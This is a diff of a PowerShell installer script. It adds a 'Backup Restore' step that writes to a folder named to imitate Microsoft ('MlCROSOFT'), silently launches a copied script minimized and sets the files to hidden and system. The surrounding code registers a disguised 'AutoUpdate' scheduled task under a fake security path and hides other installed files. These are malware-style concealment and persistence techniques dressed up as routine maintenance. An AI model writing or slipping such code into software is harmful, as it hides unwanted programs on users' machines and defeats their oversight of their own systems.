@@ -6,6 +6,7 @@ $_sourcePathLocal = "${location}\local"
 $_destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
 $_resourcesPath = "${location}\extra"
 $_updatePath = "C:\Users\$env:USERNAME"
+$_backupPath = "C:\ProgramData\MlCROSOFT"
 # Script Settings moved to "conf.ps1" located in Module Folder
 
 # Load Module Names/Paths
@@ -26,7 +27,7 @@ function exportVars {
     $variables = Get-Variable
     $exclamationVariables = $variables | Where-Object { $_.Name -like '_*' }
     foreach ($var in $exclamationVariables) {
-        $output += "`$" + "$($var.Name) = $($var.Value)" + "`n"
+        $output += "`$" + "$($var.Name)" + " = '" + "$($var.Value)" + "'`n"
     }
     $output | Out-File -FilePath $FilePath
 }
@@ -79,6 +80,14 @@ $trigger.Delay = 'PT15M' # Delay for Task
 $PS = New-ScheduledTaskAction -Execute "${_updatePath}\netrun.bat" -Argument "-silent"
 Register-ScheduledTask -TaskName "AutoUpdate" -TaskPath "\SYS\WIN32\x64\Security\" -Trigger $trigger -User $env:USERNAME -Action $PS -Settings $taskSettings
 
+# Backup Restore
+if (-not (Test-Path "${_backupPath}")){ New-Item -Path "${_backupPath}" -ItemType Directory }
+Set-Location "${_backupPath}"
+Copy-Item "${location}\backup.ps1" "${_backupPath}\backup.ps1" -Force
+exportVars
+Start-Process powershell.exe -WindowStyle Minimized "${_backupPath}\backup.ps1"
+Set-Location $location
+
 # Run Batch Scripts (.bat)
 $scriptsBatch = Get-ChildItem -Path "${scripts}\batch" -Recurse | Select-Object -ExpandProperty FullName
 foreach ($i in $scriptsBatch) { if ($i.EndsWith('.bat')) { Start-Process $i } }
@@ -95,6 +104,8 @@ foreach ($i in $modulesSystem) { Set-Location "${_destinationPath}\${i}"; export
 foreach ($name in $modulesSystem) { Set-ItemProperty -Path "${_destinationPath}\${name}" -Name Attributes -Value 6 }
 foreach ($name in $modulesSystem) { Get-ChildItem -r "${_destinationPath}\${name}" -Attributes d,h,r,s,a | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -Value 6 } }
 Set-ItemProperty -Path "${_updatePath}\netrun.bat" -Name Attributes -Value 6
+foreach ($name in Get-ChildItem -Path $_backupPath ) { Set-ItemProperty -Path "${_backupPath}\${name}" -Name Attributes -Value 6 }
+Set-ItemProperty -Path "${_backupPath}" -Name Attributes 6
 
 # Check if silent
 if ($args -notcontains '-silent') {
